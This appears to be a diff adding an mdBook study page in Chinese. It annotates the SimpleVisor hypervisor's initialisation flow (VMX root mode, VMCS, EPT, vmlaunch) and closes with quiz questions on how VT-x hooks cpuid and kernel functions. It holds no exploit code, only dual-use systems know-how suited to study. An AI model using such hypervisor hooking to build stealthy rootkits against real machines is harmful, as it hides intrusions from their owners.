+	vpData-&gt;SystemDirectoryTableBase = Context-&gt;Cr3; // TODO: 看注释，什么是PML4
+	ShvVpInitialize(vpData) // 初始化VP
+	if (ShvIsOurHypervisorPresent() == FALSE) // 通过cpuid检查当前hypervisor是否初始化成功
+											  // ~此时cpuid应该已经被hook~		
+	InterlockedIncrement(Context-&gt;InitCount); // 增加初始化成功的LP计数， This CPU is hyperjacked!
+
+
+
+ShvVpInitialize(Data)
+	ShvOsPrepareProcessor // dump,只在uefi时有用
+	ShvCaptureSpecialRegisters(&amp;Data-&gt;SpecialRegisters); // 初始化vpData的SpecialRegisters:
+														  // cr0, cr3, cr4, debug_ctl, msr_gs_base,
+														  // kernel_dr7, gdtr.limit, idtr.limit, tr, ldtr
+	ShvOsCaptureContext(&amp;Data-&gt;ContextFrame);
+		RtlCaptureContext(ContextRecord); // windows提供的函数：
+										  // Retrieves a context record in the context of the caller.
+	status = ShvVmxLaunchOnVp(Data);  // 如果EFLAGS_ALIGN_CHECK没有set，为当前处理器初始化VMX
+		
+
+ShvVmxLaunchOnVp(VpData)
+	VpData-&gt;MsrData[i].QuadPart = readmsr(MSR_IA32_VMX_BASIC + i); // 初始化VMX相关的一系列MSRs
+	ShvVmxMtrrInitialize(VpData);  // 初始化 MTRR (Memory Type Range Registers) 相关的一系列MSRs，
+								   // 这似乎是为了EPT准备的。				
+	ShvVmxEptInitialize // 初始化 EPT structures
+	ShvVmxEnterRootModeOnVp(VpData) // Attempt to enter VMX root mode on this processor.
+	ShvVmxSetupVmcsForVp(VpData); // 初始化 VMCS，包括guest和host state，大多数“可选监控项”都在这里面
+	ShvVmxLaunch()
+		vmlaunch // 这里不该返回了，返回就是失败了，后面是失败处理
+				 // 如果成功rip会指向 ShvVpRestoreAfterLaunch
+		failureCode = (INT32)ShvVmxRead(VM_INSTRUCTION_ERROR);
+		vmoff 
+	
+ShvVmxEnterRootModeOnVp(VpData)
+	// - 做一些 check
+	// - 写 revision ID到VmxOn和vmcs里面
+	// - 设置一些physical addresses
+	// - 奇怪的掩码方式设置CR0和cr4
+	__vmx_on // Enable VMX Root Mode
+	__vmx_vmclear // Clear the state of the VMCS, setting it to Inactive
+	__vmx_vmptrld // Load the VMCS, setting its state to Active
+	// 至此 VMX Root Mode is enabled, with an active VMCS.
+	
+==== 重要的数据结构 ====
+
+typedef struct _SHV_VP_DATA
+{
+    union
+    {
+        DECLSPEC_ALIGN(PAGE_SIZE) UINT8 ShvStackLimit[KERNEL_STACK_SIZE];
+        struct
+        {
+            SHV_SPECIAL_REGISTERS SpecialRegisters;
+            CONTEXT ContextFrame;
+            UINT64 SystemDirectoryTableBase;
+            LARGE_INTEGER MsrData[17];
+            SHV_MTRR_RANGE MtrrData[16];
+            UINT64 VmxOnPhysicalAddress;
+            UINT64 VmcsPhysicalAddress;
+            UINT64 MsrBitmapPhysicalAddress;
+            UINT64 EptPml4PhysicalAddress;
+            UINT32 EptControls;
+        };
+    };
+
+    DECLSPEC_ALIGN(PAGE_SIZE) UINT8 MsrBitmap[PAGE_SIZE];
+    DECLSPEC_ALIGN(PAGE_SIZE) VMX_EPML4E Epml4[PML4E_ENTRY_COUNT];
+    DECLSPEC_ALIGN(PAGE_SIZE) VMX_PDPTE Epdpt[PDPTE_ENTRY_COUNT];
+    DECLSPEC_ALIGN(PAGE_SIZE) VMX_LARGE_PDE Epde[PDPTE_ENTRY_COUNT][PDE_ENTRY_COUNT];
+
+    DECLSPEC_ALIGN(PAGE_SIZE) VMX_VMCS VmxOn;
+    DECLSPEC_ALIGN(PAGE_SIZE) VMX_VMCS Vmcs;
+} SHV_VP_DATA, *PSHV_VP_DATA;
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ask-me-something-about-vt-a-hrefvthtmlpinback-vta"><a class="header" href="#ask-me-something-about-vt-a-hrefvthtmlpinback-vta">Ask me something about vt <a href="./vt.html">Pinback: vt</a></a></h1>
+<p>为什么说vt运行在ring -1层？</p>
+<p>宿主机是win10，虚拟机是win7，在vm里面安装vt驱动，画出整个架构图。</p>
+<p>嵌套虚拟化是什么意思？</p>
+<p>vt是如何hook cpuid的？</p>
+<p>vt除了hook指令还可以做什么其他的事情，比如hook用户层/内核函数？</p>
+<p>为什么vt的载体是一个驱动？</p>
+<p>power callback 是干什么的，为什么要在hypervisor的DriverEntry里面初始化它，SimpleVisor和HyperPlatform都有？</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+                        
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+                            </nav>
+
+        </div>
+
+        
+        
+        
+                <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        
+                <script src="ace.js" type="text/javascript" charset="utf-8"></script>
+        <script src="editor.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mode-rust.js" type="text/javascript" charset="utf-8"></script>
+        <script src="theme-dawn.js" type="text/javascript" charset="utf-8"></script>
+        <script src="theme-tomorrow_night.js" type="text/javascript" charset="utf-8"></script>
+        
+                <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+                        <script type="text/javascript">
+        window.addEventListener('load', function() {
+            MathJax.Hub.Register.StartupHook('End', function() {
+                window.setTimeout(window.print, 100);
+            });
+        });
+        </script>
+                
+    </body>
+</html>
